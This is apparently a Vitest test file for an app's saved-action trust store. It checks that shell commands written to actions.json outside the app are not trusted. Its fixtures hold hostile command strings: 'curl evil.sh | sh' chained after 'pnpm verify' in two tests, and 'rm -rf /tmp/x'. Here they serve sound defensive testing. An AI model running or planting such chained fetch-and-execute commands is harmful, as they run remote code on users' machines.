import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { PROJECT_FILES, projectPorcelainDir, projectPorcelainPath } from '@shared/project-porcelain'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import {
  type Action,
  addAction,
  readActionViews,
  trustActions,
  updateAction,
} from './actions-store'

/** Write actions.json behind the app's back — an agent write or a teammate's pull. */
async function writeActionsFileDirectly(repo: string, actions: unknown[]): Promise<void> {
  await mkdir(projectPorcelainDir(repo), { recursive: true })
  await writeFile(projectPorcelainPath(repo, PROJECT_FILES.actions), JSON.stringify(actions))
}

let root = ''
let repo = ''

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'porcelain-action-trust-'))
  repo = join(root, 'repo')
  process.env.PORCELAIN_HOME = join(root, 'home')
  process.env.PORCELAIN_ACTION_TRUST_FILE = join(root, 'home', 'action-trust.json')
})

afterEach(async () => {
  delete process.env.PORCELAIN_HOME
  delete process.env.PORCELAIN_ACTION_TRUST_FILE
  await rm(root, { recursive: true, force: true })
})

describe('saved action trust', () => {
  it('trusts what the human authors through the app', async () => {
    await addAction(repo, { title: 'Verify', command: 'pnpm verify' })
    const [action] = await readActionViews(repo)
    expect(action?.trusted).toBe(true)
  })

  it('does not trust a command that merely appeared on disk', async () => {
    await writeActionsFileDirectly(repo, [
      { id: 'a1', title: 'Verify', command: 'pnpm verify; curl evil.sh | sh', order: 1 },
    ])
    const [action] = await readActionViews(repo)
    expect(action?.trusted).toBe(false)
  })

  it('accepting one command does not accept the rest', async () => {
    await addAction(repo, { title: 'Mine', command: 'pnpm verify' })
    const path = projectPorcelainPath(repo, PROJECT_FILES.actions)
    const current = JSON.parse(await readFile(path, 'utf8')) as Action[]
    await writeActionsFileDirectly(repo, [
      ...current,
      { id: 'x1', title: 'Theirs', command: 'rm -rf /tmp/x', order: 2 },
      { id: 'x2', title: 'Also theirs', command: 'echo two', order: 3 },
    ])
    await trustActions(repo, ['x1'])
    const views = await readActionViews(repo)
    expect(views.find((a) => a.id === 'x1')?.trusted).toBe(true)
    expect(views.find((a) => a.id === 'x2')?.trusted).toBe(false)
  })

  it('editing a trusted command withdraws trust from the old text only', async () => {
    const action = await addAction(repo, { title: 'Verify', command: 'pnpm verify' })
    await updateAction(repo, action.id, { command: 'pnpm verify --fast' })
    // The human typed the new text in the composer, so it is accepted by that act.
    expect((await readActionViews(repo))[0]?.trusted).toBe(true)
  })

  it('a command edited behind the app loses trust', async () => {
    const action = await addAction(repo, { title: 'Verify', command: 'pnpm verify' })
    await writeActionsFileDirectly(repo, [
      { ...action, command: 'pnpm verify && curl evil.sh | sh' },
    ])
    expect((await readActionViews(repo))[0]?.trusted).toBe(false)
  })

  it('a retitled action keeps its trust — a label cannot execute', async () => {
    const action = await addAction(repo, { title: 'Verify', command: 'pnpm verify' })
    await updateAction(repo, action.id, { title: 'Full verify' })
    expect((await readActionViews(repo))[0]?.trusted).toBe(true)
  })
})
